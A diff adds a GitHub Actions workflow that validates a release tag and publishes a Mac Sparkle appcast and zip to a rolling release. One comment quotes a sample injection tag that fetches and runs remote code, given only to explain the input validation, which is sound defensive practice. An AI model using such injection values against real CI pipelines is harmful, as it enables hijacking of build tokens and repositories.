@@ -1,0 +1,102 @@
+name: Mac appcast
+
+# Mac Sparkle reads appcast.xml from one fixed rolling release (tag =
+# mac-appcast), not from releases/latest: iOS and Mac ride different trains, and
+# an iOS-only release becoming latest must not break Mac users' updates.
+#
+# The trigger is "a Release got published", not "release.yml finished" — a
+# draft's zip can't be downloaded anonymously, and a feed that goes live before
+# its zip shows Mac users a 404 update. The Publish click is the moment the Mac
+# update actually ships.
+# Zero secrets: only GITHUB_TOKEN, moving two assets.
+#
+# The repo is still private — manual dispatch only until it goes public.
+# After going public, restore:
+#   release:
+#     types: [published]
+on:
+  workflow_dispatch:
+    inputs:
+      tag:
+        description: The already-published Release tag (vX.Y.Z)
+        type: string
+        required: true
+
+permissions:
+  contents: write
+
+concurrency:
+  group: mac-appcast
+  cancel-in-progress: false
+
+jobs:
+  feed:
+    name: Point the feed at this release
+    runs-on: ubuntu-latest
+    env:
+      GH_TOKEN: ${{ github.token }}
+      FEED_TAG: mac-appcast
+    steps:
+      # The tag is attacker-controlled input (anyone who can dispatch, or later
+      # anyone who can publish a Release). ${{ }} expands BEFORE the shell starts,
+      # so it must never appear in a run: body — a tag of v1"; curl evil | sh; #
+      # would execute with this job's contents:write token. Pass it through env:
+      # and only ever reference "$RAW_TAG", then validate before it reaches gh.
+      - name: Resolve tag
+        id: tag
+        env:
+          RAW_TAG: ${{ github.event.release.tag_name || inputs.tag }}
+        run: |
+          set -euo pipefail
+          if [[ ! "$RAW_TAG" =~ ^v[0-9]+(\.[0-9]+)+$ ]]; then
+            echo "not a version tag: $RAW_TAG"
+            echo "skip=1" >> "$GITHUB_OUTPUT"
+            exit 0
+          fi
+          echo "tag=$RAW_TAG" >> "$GITHUB_OUTPUT"
+          echo "skip=0" >> "$GITHUB_OUTPUT"
+
+      - name: Download Mac assets from the published release
+        if: steps.tag.outputs.skip == '0'
+        id: assets
+        env:
+          TAG: ${{ steps.tag.outputs.tag }}
+        run: |
+          set -euo pipefail
+          mkdir -p feed && cd feed
+          if ! gh release download "$TAG" --repo "$GITHUB_REPOSITORY" \
+               -p appcast.xml -p 'TollCat-*-mac.zip' -p 'TollCat-*-mac.zip.sha256' 2>/dev/null; then
+            echo "no Mac assets on $TAG (iOS-only train); feed untouched"
+            echo "has_mac=0" >> "$GITHUB_OUTPUT"
+            exit 0
+          fi
+          if [[ ! -f appcast.xml ]]; then
+            echo "has_mac=0" >> "$GITHUB_OUTPUT"
+            exit 0
+          fi
+          # The landing page's "Download for Mac" points at a stable, unversioned filename.
+          cp TollCat-*-mac.zip TollCat-mac.zip
+          echo "has_mac=1" >> "$GITHUB_OUTPUT"
+
+      - name: Ensure the rolling release exists
+        if: steps.assets.outputs.has_mac == '1'
+        run: |
+          set -euo pipefail
+          if ! gh release view "$FEED_TAG" --repo "$GITHUB_REPOSITORY" >/dev/null 2>&1; then
+            gh release create "$FEED_TAG" --repo "$GITHUB_REPOSITORY" \
+              --title "Mac auto-update feed" \
+              --latest=false \
+              --notes "This release only carries Sparkle's appcast.xml and a copy of the current Mac zip, overwritten by mac-appcast.yml on every Mac publish. For release notes, see the corresponding vX.Y.Z release."
+          fi
+
+      - name: Replace feed assets
+        if: steps.assets.outputs.has_mac == '1'
+        env:
+          TAG: ${{ steps.tag.outputs.tag }}
+        run: |
+          set -euo pipefail
+          gh release upload "$FEED_TAG" --repo "$GITHUB_REPOSITORY" --clobber \
+            feed/appcast.xml feed/TollCat-mac.zip
+          gh release edit "$FEED_TAG" --repo "$GITHUB_REPOSITORY" --latest=false \
+            --notes "Currently pointing at $TAG. This release only carries Sparkle's appcast.xml and a copy of the current Mac zip, overwritten by mac-appcast.yml on every Mac publish. For release notes, see the corresponding vX.Y.Z release."
+          echo "feed now points at $TAG"
